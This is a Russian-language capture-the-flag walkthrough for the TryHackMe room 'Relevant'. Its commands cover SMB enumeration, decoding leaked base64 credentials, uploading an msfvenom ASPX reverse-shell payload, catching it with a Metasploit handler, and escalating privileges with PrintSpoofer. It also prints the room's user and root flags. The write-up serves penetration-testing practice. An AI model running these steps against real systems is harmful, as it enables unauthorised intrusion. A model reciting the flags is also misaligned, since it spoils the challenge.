[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Relevant](https://tryhackme.com/r/room/relevant) 

Всего 1 заданиe:
## Задание 1
Вас направили к клиенту, который хочет провести тест на проникновение в среду, которая должна быть запущена в 
эксплуатацию через семь дней.

#### Объем работ

Клиент просит инженера провести оценку предоставленной виртуальной среды. Клиент попросил предоставить минимальную 
информацию об оценке, желая, чтобы взаимодействие проводилось с точки зрения злоумышленника (тест на проникновение 
черного ящика). Клиент попросил вас закрепить два флага (местоположение не указано) в качестве доказательства 
эксплуатации:
- Пользователь.txt
- Корень.txt


Кроме того, клиент предоставил следующие допуски по объему работ:
- В этом проекте разрешены любые инструменты и методы, однако мы просим вас сначала попробовать ручную эксплуатацию.
- Найдите и запишите все обнаруженные уязвимости.
- Отправьте обнаруженные флаги на панель управления
- В область действия входит только IP-адрес, назначенный вашему компьютеру.
- Найдите и сообщите обо ВСЕХ уязвимостях (да, существует более одного пути к получению прав root)
(Ролевая игра выключена)

Я призываю вас подойти к этой задаче как к реальному тесту на проникновение. Подумайте о написании отчета, 
включающего в себя резюме, оценку уязвимости и эксплуатации, а также предложения по исправлению, поскольку это 
принесет вам пользу при подготовке к eLearnSecurity Certified Professional Penetration Tester или карьере 
тестировщика на проникновение в этой области.   
Примечание. Ничто в этой комнате не требует Metasploit.

Для запуска всех служб машине может потребоваться до 5 минут.

**Заметки в этой комнате не принимаются.**

### Ответьте на вопросы ниже
Пользовательский флаг
```commandline
nmap -sC -sV -p- <IP>
smbclient //<IP>
smbclient //<IP>/nt4wrksv
get passwords.txt
cat passwords.txt 
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
# Bob - !P@$$W0rD!123
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
# Bill - Juw4nnaM4n420696969!$$$
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=4444 -f aspx -o shell.aspx
put shell.aspx
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set lhost <IP>
set lport 4444
run
curl http://<IP>:49663/nt4wrksv/shell.aspx
cat c:/users/bob/desktop/user.txt
```
```commandline
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```
Корневой флаг
```commandline
getprivs
cd \inetpub\wwwroot\nt4wrksv
PrintSpoofer.exe -i -c powershell.exe
cd \users\administrator\desktop
cat root.txt
```
```commandline
THM{1fk5kf469devly1gl320zafgl345pv}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)